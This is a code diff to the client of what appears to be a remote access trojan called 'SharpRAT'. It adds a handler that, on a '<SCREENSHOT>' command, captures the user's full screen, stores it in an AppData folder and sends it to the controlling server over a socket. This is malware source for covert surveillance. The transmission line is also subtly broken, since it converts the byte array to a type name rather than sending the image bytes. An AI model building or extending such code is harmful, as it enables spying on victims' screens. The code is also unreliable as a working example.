@@ -1,5 +1,6 @@
 ﻿
 using Microsoft.Win32;
+using System.Diagnostics;
 using System.Text;
 
 namespace Client.Client
@@ -55,6 +56,32 @@ namespace Client.Client
                 tempString = tempString.Replace("<REQUEST-DIRS>", "");
 
                 FileManager.LoadDirectories(tempString);
+            }
+            else if (tempString.StartsWith("<SCREENSHOT>"))
+            {
+                Debug.WriteLine("received screenshot command");
+
+                Bitmap bitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
+                Graphics g = Graphics.FromImage(bitmap);
+                g.CopyFromScreen(0, 0, 0, 0, bitmap.Size);
+                Graphics memoryGraphics = Graphics.FromImage(bitmap);
+
+                memoryGraphics.CopyFromScreen(0, 0, 0, 0, bitmap.Size);
+
+                //That's it! Save the image in the directory and this will work like charm.  
+                string fileName = string.Format(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\SharpRAT\screenshot\Screenshot" + "_" + DateTime.Now.ToString("(dd_MMMM_hh_mm_ss_tt)") + ".png");
+
+                // save it  
+                bitmap.Save(fileName);
+                MemoryStream ms = new MemoryStream();
+                bitmap.Save(ms, System.Drawing.Imaging.ImageFormat.Bmp);
+                byte[] b = ms.ToArray();
+                Debug.WriteLine($"{b}");
+                Main.socketClient.GetServerSocket().Send(Encoding.ASCII.GetBytes("<SCREENSHOT>"+ b +"<EOF>"));
+                //GetServerSocket().Send(Encoding.ASCII.GetBytes($"{ b}"));
+                //GetServerSocket().Send(Encoding.ASCII.GetBytes("<EOF>"));
+                ms.Close();
+                Debug.WriteLine("sent data back");
             }
         }
 
